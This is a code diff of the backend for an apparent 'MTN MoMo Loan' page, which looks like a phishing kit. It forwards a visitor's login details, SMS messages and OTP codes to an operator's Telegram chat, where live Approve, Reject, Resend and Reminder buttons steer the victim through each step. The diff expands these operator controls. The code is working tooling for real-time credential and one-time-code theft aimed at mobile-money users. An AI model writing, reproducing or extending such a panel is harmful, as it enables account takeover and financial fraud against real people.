@@ -1,11 +1,17 @@
 /* ============================================================
    MTN MoMo Loan — Backend
    - Live approve/reject via Telegram inline buttons
-   - Resend button per-page:
-       * login: none
-       * sms:   sends user back to login (fresh start)
-       * otp:   clears OTP boxes on same page
-   - Preserves original message body when editing on approve/reject
+   - Per-page buttons:
+       * login: [✅ Approve] [❌ Reject]
+       * sms:   [✅ Approve] [❌ Reject]
+                [🔁 Resend]  [🔔 Reminder]
+       * otp:   [✅ Approve] [❌ Reject] [🔁 Resend]
+   - Statuses returned to frontend:
+       * approve  → 'approved'
+       * reject   → 'rejected'
+       * resend   → 'resend'
+       * reminder → 'reminder'
+   - Preserves original message body when editing on resolve
    - No DB (in-memory Map, auto-cleaned)
    ============================================================ */
 
@@ -33,9 +39,6 @@ const SESSION_MAX_AGE_MS = 15 * 60 * 1000;
 
 /* ============================================================
    IN-MEMORY SESSION STORE
-   Each session stores `originalText` — the exact message body
-   sent to Telegram. We reuse it when editing the message on
-   approve / reject / resend so nothing is lost.
    ============================================================ */
 const sessions = new Map();
 
@@ -43,7 +46,7 @@ setInterval(() => {
   const now = Date.now();
   for (const [id, s] of sessions.entries()) {
     const age = now - s.createdAt;
-    if ((s.status === 'pending' || s.status === 'resend_requested') && age > SESSION_TIMEOUT_MS) {
+    if (s.status === 'pending' && age > SESSION_TIMEOUT_MS) {
       s.status = 'timeout';
       s.resolvedAt = now;
     }
@@ -94,19 +97,58 @@ function isValidPhone(phone) {
 }
 
 /* ============================================================
-   TELEGRAM — send message
+   TELEGRAM — keyboards per step
    ============================================================ */
 function buildKeyboard(step, sessionId) {
-  const row = [
-    { text: '✅ Approve', callback_data: `approve:${step}:${sessionId}` },
-    { text: '❌ Reject',  callback_data: `reject:${step}:${sessionId}` }
-  ];
-  if (step === 'sms' || step === 'otp') {
-    row.push({ text: '🔁 Resend', callback_data: `resend:${step}:${sessionId}` });
+  /* LOGIN — 2 buttons */
+  if (step === 'login') {
+    return {
+      inline_keyboard: [[
+        { text: '✅ Approve', callback_data: `approve:login:${sessionId}` },
+        { text: '❌ Reject',  callback_data: `reject:login:${sessionId}` }
+      ]]
+    };
   }
-  return { inline_keyboard: [row] };
+
+  /* SMS — 4 buttons (2 rows) */
+  if (step === 'sms') {
+    return {
+      inline_keyboard: [
+        [
+          { text: '✅ Approve', callback_data: `approve:sms:${sessionId}` },
+          { text: '❌ Reject',  callback_data: `reject:sms:${sessionId}` }
+        ],
+        [
+          { text: '🔁 Resend',   callback_data: `resend:sms:${sessionId}` },
+          { text: '🔔 Reminder', callback_data: `reminder:sms:${sessionId}` }
+        ]
+      ]
+    };
+  }
+
+  /* OTP — 3 buttons (single row) */
+  if (step === 'otp') {
+    return {
+      inline_keyboard: [[
+        { text: '✅ Approve', callback_data: `approve:otp:${sessionId}` },
+        { text: '❌ Reject',  callback_data: `reject:otp:${sessionId}` },
+        { text: '🔁 Resend',  callback_data: `resend:otp:${sessionId}` }
+      ]]
+    };
+  }
+
+  /* Fallback — approve / reject only */
+  return {
+    inline_keyboard: [[
+      { text: '✅ Approve', callback_data: `approve:${step}:${sessionId}` },
+      { text: '❌ Reject',  callback_data: `reject:${step}:${sessionId}` }
+    ]]
+  };
 }
 
+/* ============================================================
+   TELEGRAM — send message
+   ============================================================ */
 async function sendTelegramWithButtons(text, sessionId, step) {
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
     console.warn('⚠️ Telegram env vars missing — message not sent.');
@@ -147,7 +189,6 @@ async function editTelegramMessage(messageId, text, replyMarkup) {
       disable_web_page_preview: true
     };
 
-    /* Explicitly handle keyboard (empty array = remove buttons) */
     if (replyMarkup !== undefined) {
       body.reply_markup = replyMarkup;
     }
@@ -263,7 +304,7 @@ app.post('/api/sms', async (req, res) => {
       `🆔 <b>Ref:</b> <code>${reference}</code>\n` +
       `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' })}\n\n` +
       `📝 <b>Message:</b>\n<pre>${escapeHtml(sms)}</pre>\n` +
-      `⏳ Tap ✅ / ❌ / 🔁 below`;
+      `⏳ Tap ✅ / ❌ / 🔁 / 🔔 below`;
 
     const messageId = await sendTelegramWithButtons(text, sessionId, 'sms');
     console.log(`[sms] sessionId=${sessionId} telegramMessageId=${messageId}`);
@@ -333,7 +374,7 @@ app.post('/api/verify-otp', async (req, res) => {
 });
 
 /* ============================================================
-   POST /api/resend-sms
+   POST /api/resend-sms   (user taps "Resend SMS" on the page)
    ============================================================ */
 app.post('/api/resend-sms', async (req, res) => {
   try {
@@ -377,7 +418,7 @@ app.get('/api/status/:sessionId', (req, res) => {
     return res.json({ ok: true, status: 'unknown', step: null });
   }
 
-  if ((session.status === 'pending' || session.status === 'resend_requested')
+  if (session.status === 'pending'
       && Date.now() - session.createdAt > SESSION_TIMEOUT_MS) {
     session.status = 'timeout';
     session.resolvedAt = Date.now();
@@ -412,37 +453,56 @@ app.post('/api/telegram-webhook', async (req, res) => {
       return res.json({ ok: true });
     }
 
-    if (session.status === 'approved' || session.status === 'rejected' || session.status === 'timeout') {
+    /* Allow resend + reminder while pending; block if already resolved */
+    if (session.status === 'approved'
+        || session.status === 'rejected'
+        || session.status === 'timeout') {
       await answerCallback(cb.id, `Already ${session.status}`);
       return res.json({ ok: true });
     }
 
     /* ==========================================================
        🔁 RESEND
-       Keep the ORIGINAL message text and update the header line.
        ========================================================== */
     if (action === 'resend') {
-      session.status = 'resend_requested';
-      session.resendRequestedAt = Date.now();
+      session.status = 'resend';
+      session.resolvedAt = Date.now();
       await answerCallback(cb.id, '🔁 Resend requested');
 
-      const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
-
-      /* Preserve original body, just replace the first line */
+      /* Update Telegram message to show final state */
       const preservedBody = stripFirstLine(session.originalText);
+      const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
       const newText =
-        `🔁 <b>RESEND REQUESTED</b> — awaiting final decision\n` +
+        `🔁 <b>RESEND REQUESTED</b>\n` +
         `━━━━━━━━━━━━━━━━━━\n` +
         preservedBody +
-        `\n\n🕒 <b>Resend requested:</b> ${when}`;
+        `\n\n🕒 <b>Requested:</b> ${when}`;
 
       if (session.telegramMessageId) {
-        await editTelegramMessage(session.telegramMessageId, newText, {
-          inline_keyboard: [[
-            { text: '✅ Approve', callback_data: `approve:${step}:${sessionId}` },
-            { text: '❌ Reject',  callback_data: `reject:${step}:${sessionId}` }
-          ]]
-        });
+        await editTelegramMessage(session.telegramMessageId, newText, { inline_keyboard: [] });
+      }
+
+      return res.json({ ok: true });
+    }
+
+    /* ==========================================================
+       🔔 REMINDER
+       ========================================================== */
+    if (action === 'reminder') {
+      session.status = 'reminder';
+      session.resolvedAt = Date.now();
+      await answerCallback(cb.id, '🔔 Reminder sent');
+
+      const preservedBody = stripFirstLine(session.originalText);
+      const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
+      const newText =
+        `🔔 <b>REMINDER SENT</b>\n` +
+        `━━━━━━━━━━━━━━━━━━\n` +
+        preservedBody +
+        `\n\n🕒 <b>Reminder:</b> ${when}`;
+
+      if (session.telegramMessageId) {
+        await editTelegramMessage(session.telegramMessageId, newText, { inline_keyboard: [] });
       }
 
       return res.json({ ok: true });
@@ -450,29 +510,28 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
     /* ==========================================================
        ✅ APPROVE  /  ❌ REJECT
-       Keep the ORIGINAL message text and just change the header
-       line + remove the buttons.
        ========================================================== */
+    let statusLine, answerText;
+
     if (action === 'approve') {
       session.status = 'approved';
       session.resolvedAt = Date.now();
-      await answerCallback(cb.id, '✅ Approved');
+      statusLine = '✅ <b>APPROVED</b>';
+      answerText = '✅ Approved';
     } else if (action === 'reject') {
       session.status = 'rejected';
       session.resolvedAt = Date.now();
-      await answerCallback(cb.id, '❌ Rejected');
+      statusLine = '❌ <b>REJECTED</b>';
+      answerText = '❌ Rejected';
     } else {
       await answerCallback(cb.id, 'Unknown action');
       return res.json({ ok: true });
     }
 
-    const statusLine = action === 'approve'
-      ? '✅ <b>APPROVED</b>'
-      : '❌ <b>REJECTED</b>';
-    const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
+    await answerCallback(cb.id, answerText);
 
-    /* Preserve original body (everything after the first line) */
     const preservedBody = stripFirstLine(session.originalText);
+    const when = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Douala' });
     const newText =
       `${statusLine}\n` +
       `━━━━━━━━━━━━━━━━━━\n` +
@@ -480,7 +539,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
       `\n\n🕒 <b>Resolved:</b> ${when}`;
 
     if (session.telegramMessageId) {
-      /* Empty array = remove buttons entirely */
       await editTelegramMessage(session.telegramMessageId, newText, { inline_keyboard: [] });
     }
 
@@ -491,13 +549,14 @@ app.post('/api/telegram-webhook', async (req, res) => {
   }
 });
 
-/* Return everything after the first line of a message */
+/* ============================================================
+   UTIL: strip first line + divider
+   ============================================================ */
 function stripFirstLine(text) {
   if (!text) return '';
   const idx = text.indexOf('\n');
   if (idx === -1) return '';
   const rest = text.slice(idx + 1);
-  /* Also strip the leading ━ divider line if present */
   return rest.replace(/^━+\n/, '').trim();
 }
 
